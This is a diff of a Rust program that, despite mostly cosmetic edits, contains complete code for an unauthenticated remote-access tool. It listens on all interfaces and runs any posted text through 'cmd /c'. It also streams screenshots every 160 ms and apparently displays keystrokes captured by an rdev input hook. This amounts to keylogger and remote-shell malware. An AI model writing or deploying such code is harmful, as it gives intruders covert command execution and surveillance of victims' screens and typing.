@@ -9,7 +9,7 @@ use rdev::listen;
 use serde::Deserialize;
 use std::{
     env::args,
-    io::{Cursor, Seek, SeekFrom},
+    io::Cursor,
     sync::{Arc, Mutex},
 };
 use tokio::{main, net::TcpListener, process::Command, spawn};
@@ -25,7 +25,6 @@ async fn main() {
     let lock = Arc::new(Mutex::new(String::new()));
     let lock1 = Arc::clone(&lock);
     let lock2 = Arc::clone(&lock);
-    let lock3 = Arc::clone(&lock);
     spawn(async {
         let lockin = lock2;
         loop {
@@ -39,51 +38,42 @@ async fn main() {
         }
     });
     axum::serve(
-        TcpListener::bind(String::from ("0.0.0.0:") + &arg.next().unwrap_or(String::from("1145"))).await.unwrap(),
+        TcpListener::bind(String::from("0.0.0.0:") +
+            &arg.next().unwrap_or(String::from("1145"))).await.unwrap(),
         Router::new()
-            .route("/", get(async move || {
+    .route("/", get(async move || {
         let data = lock1.lock();
         ({
-        let mut head = HeaderMap::new();
-        head.insert(
-            "Cache-Control",
-            HeaderValue::from_static("no-store, no-cache, must-revalidate, max-age=0"),
-        );
-        head.insert("Expires", HeaderValue::from_static("-1"));
-        head.insert("Pragma", HeaderValue::from_static("no-cache"));
-        head
-    }, Html(
+            let mut head = HeaderMap::new();
+            head.insert(
+                "Cache-Control",
+                HeaderValue::from_static("no-store, no-cache, must-revalidate, max-age=0"),
+            );
+            head.insert("Expires", HeaderValue::from_static("-1"));
+            head.insert("Pragma", HeaderValue::from_static("no-cache"));
+            head
+        }, Html(
             String::from(
                 r#"<!DOCTYPE html><html><body><form action="/cmd" method="post"><textarea name="area"></textarea><input type="submit" value="提交" /></form><a href="/clear">清空</a><pre style="white-space: pre-wrap;">"#,
             ) + data.unwrap().as_str()
                 + r#"</pre><img src="screen.bmp"/><script>setInterval(()=>{document.querySelector("img").src="/screen.bmp?"+Date.now()},160);</script></body></html>"#,
         )).into_response()
-    }))
-            .route("/cmd", post(async |Form(Frm { mut area })| {
+    })) .route("/cmd", post(async |Form(Frm { mut area })| {
         area = String::from("cmd /c ") + &area;
         let parts: Vec<&str> = area.split_whitespace().collect();
         Command::new(parts[0]).args(&parts[1..]).spawn().unwrap();
         Html(
             r#"<!DOCTYPE html><html><body><script>window.location.href="/"</script></body></html>"#,
         )
-    }))
-            .route("/clear", get(async move || {
-        lock3.lock().unwrap().clear();
+    })) .route("/clear", get(async move || {
+        lock.lock().unwrap().clear();
         Html(
             r#"<!DOCTYPE html><html><body><script>window.location.href="/"</script></body></html>"#,
         )
-    }))
-            .route("/screen.bmp", get(async || {
+    })) .route("/screen.bmp", get(async || {
         let mut buf = Cursor::new(Vec::new());
-        let mnt = &Monitor::all().unwrap()[0];
-        mnt.capture_image()
-            .unwrap()
-            .write_to(&mut buf, ImageFormat::Bmp)
-            .unwrap();
-        buf.seek(SeekFrom::Start(0)).unwrap();
+        Monitor::all().unwrap()[0].capture_image().unwrap()
+            .write_to(&mut buf, ImageFormat::Bmp).unwrap();
         buf.into_inner()
-    })),
-    )
-    .await
-    .unwrap();
+    }))).await.unwrap();
 }
